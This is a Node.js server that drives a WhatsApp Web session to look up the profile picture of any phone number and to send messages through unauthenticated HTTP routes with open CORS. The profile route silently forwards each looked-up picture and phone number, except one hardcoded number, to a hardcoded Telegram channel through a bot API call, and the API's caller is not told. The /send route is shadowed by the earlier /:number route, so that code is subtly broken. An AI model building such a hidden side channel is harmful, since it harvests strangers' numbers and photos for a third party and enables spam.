// Import required modules
const { Client, LocalAuth } = require('whatsapp-web.js');
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const qrcode = require('qrcode-terminal'); // Import the qrcode-terminal module
const fetch = require('node-fetch'); // Import node-fetch module for Telegram API calls

// Initialize Express app
const app = express();
const port = 3000;
let serverStarted = false; // Flag to ensure server only starts once
let isReconnecting = false; // Flag to prevent multiple reconnections

// Use CORS
app.use(cors());

// Use Gzip Compression
app.use(compression());

// Initialize WhatsApp client with LocalAuth for persistent session
const client = new Client({
    authStrategy: new LocalAuth(), // LocalAuth saves session so no re-scan is needed
    puppeteer: { headless: true } // Optional: Use headless mode for Puppeteer
});

// Display QR code in terminal when needed (for initial login)
client.on('qr', (qr) => {
    qrcode.generate(qr, { small: true });
    console.log('QR code received, scan it with WhatsApp!');
});

// Client is ready and connected
client.on('ready', async () => {
    console.log('Client is ready to use!');

    // Only start the server if it hasn't been started already
    if (!serverStarted) {
        app.listen(port, () => {
            console.log(`API server is running on http://localhost:${port}`);
        });
        serverStarted = true; // Set the flag to true after the server starts
    }
});

// Listen for incoming messages and respond to specific commands
client.on('message', (msg) => {
    if (msg.body.toLowerCase() === '!ping') {
        msg.reply('pong');
    }
});

// Route to get profile picture of a WhatsApp number
app.get('/:number', async (req, res) => {
    let phone = req.params.number;
    const phoneNumber = `${phone}@c.us`;

    try {
        // Get profile picture URL of the specified phone number
        let profilePicUrl = await client.getProfilePicUrl(phoneNumber);

        if (profilePicUrl) {
            // Send response with profile picture URL
            res.json({ profilePicUrl, status: { status: "" } });

            // Send profile picture to Telegram channel if phone number is not a specific number
            if (phoneNumber !== '917994107442@c.us') {
                const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
                const telegramUrl = `https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;

                try {
                    await fetch(telegramUrl);
                } catch (fetchError) {
                    console.error('Failed to send photo to Telegram:', fetchError);
                }
            }
        } else {
            // No profile picture found for the specified number
            res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
        }
    } catch (error) {
        console.error('Error fetching profile picture, attempting to reconnect:', error);

        // Attempt to reconnect the WhatsApp client if not already reconnecting
        if (!isReconnecting) {
            isReconnecting = true; // Set the flag to indicate reconnection is in progress
            try {
                await client.initialize(); // Re-initialize the client without destroying it
                console.log('Reconnected to WhatsApp successfully!');
            } catch (reconnectError) {
                console.error('Failed to reconnect to WhatsApp:', reconnectError);
            } finally {
                isReconnecting = false; // Reset the flag after reconnection attempt
            }
        }

        res.status(500).json({ error: 'Failed to fetch profile picture and attempted to reconnect.' });
    }
});

// New API to send a message to a specific phone number
app.get('/send', async (req, res) => {
    const phoneNumber = `${req.query.nm?.replaceAll('"','')}@c.us`; // Phone number in param 'nm'
    const message = req.query.message; // Message in param 'message'

    // Validate if phone number and message are provided
    if (!phoneNumber || !message) {
        return res.status(400).json({ error: 'Phone number (nm) and message are required.' });
    }

    try {
        // Send the message to the specified phone number
        await client.sendMessage(phoneNumber, message);
        res.json({ status: 'Message sent successfully', phoneNumber, message });
    } catch (error) {
        console.error('Error sending message, attempting to reconnect:', error);

        // Attempt to reconnect the WhatsApp client if not already reconnecting
        if (!isReconnecting) {
            isReconnecting = true; // Set the flag to indicate reconnection is in progress
            try {
                await client.initialize(); // Re-initialize the client without destroying it
                console.log('Reconnected to WhatsApp successfully!');
            } catch (reconnectError) {
                console.error('Failed to reconnect to WhatsApp:', reconnectError);
            } finally {
                isReconnecting = false; // Reset the flag after reconnection attempt
            }
        }

        res.status(500).json({ error: 'Failed to send message and attempted to reconnect.', details: error.message });
    }
});

// Handle client disconnection events and reinitialize if disconnected
client.on('disconnected', (reason) => {
    console.log('WhatsApp client disconnected:', reason);

    // Attempt to reconnect the WhatsApp client if not already reconnecting
    if (!isReconnecting) {
        isReconnecting = true; // Set the flag to indicate reconnection is in progress
        client.initialize()
            .then(() => {
                console.log('Reconnected to WhatsApp successfully!');
            })
            .catch((error) => {
                console.error('Failed to reconnect to WhatsApp:', error);
            })
            .finally(() => {
                isReconnecting = false; // Reset the flag after reconnection attempt
            });
    }
});

// Initialize the WhatsApp client
client.initialize()
    .then(() => console.log('WhatsApp client is initializing...'))
    .catch((error) => console.error('Failed to initialize WhatsApp client:', error));
